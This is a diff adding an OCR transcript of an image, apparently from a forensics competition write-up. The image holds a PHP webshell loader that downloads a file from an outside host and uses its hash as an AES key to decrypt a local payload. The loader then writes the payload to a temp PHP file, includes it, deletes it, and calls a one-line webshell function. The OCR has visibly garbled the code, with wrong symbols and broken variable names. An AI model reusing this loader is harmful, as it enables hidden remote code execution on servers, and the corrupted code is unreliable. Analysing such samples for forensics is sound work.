@@ -1,0 +1,18 @@
+# OCR: 0ef2d5e6854d7a5543507bfa0e9c57c6.webp
+# 来源: ./02-WriteUp/2025/2025-FIC-初赛参考WP/0ef2d5e6854d7a5543507bfa0e9c57c6.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:27
+
+1 2
+8 9 18 11 12 13 14 15 16 17
+<?php
+$a=file_get_contents（"https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css'）; $b=md5($a,true);
+$c=file_get_contents('../../../../encrypted.bin');
+$d=base64_decode($c); $e='aes-256-cbc'
+sf=openssl_cipher_iv_length(se);
+$g=substr($d,e,$f); $h=substr($d,$f):
+$i=openssl_decrypt($h,$e,$b,oPENsSL_RAw_ATA,$g) $j=sys_get_temp_dir();
+$k=sj./func_".uniqid()..php';
+file_put_contents(sk,"<?php\n".si);
+include$kj unlink($k); yijuhua();?>
